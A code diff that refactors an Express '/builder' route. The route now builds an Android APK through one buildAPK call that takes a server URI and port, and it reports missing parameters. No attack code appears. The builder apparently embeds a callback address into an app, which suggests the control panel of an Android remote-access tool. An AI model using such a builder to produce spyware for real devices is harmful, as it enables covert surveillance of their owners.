@@ -88,8 +88,9 @@ routes.get('/builder', isAllowed, (req, res) => {
 });
 
 routes.post('/builder', isAllowed, (req, res) => {
-    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
-        if (!error) apkBuilder.buildAPK((error) => {
+    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) {
+        // 使用新的unified buildAPK API，自动选择ApkTool或Gradle方案
+        apkBuilder.buildAPK(req.query.uri, req.query.port, (error) => {
             if (!error) {
                 logManager.log(CONST.logTypes.success, "Build Succeded!");
                 res.json({ error: false });
@@ -98,12 +99,8 @@ routes.post('/builder', isAllowed, (req, res) => {
                 res.json({ error });
             }
         });
-        else {
-            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-            res.json({ error });
-        }
-    });
-    else {
+    } else {
+        const error = "Missing URI or PORT parameter";
         logManager.log(CONST.logTypes.error, "Build Failed - " + error);
         res.json({ error });
     }
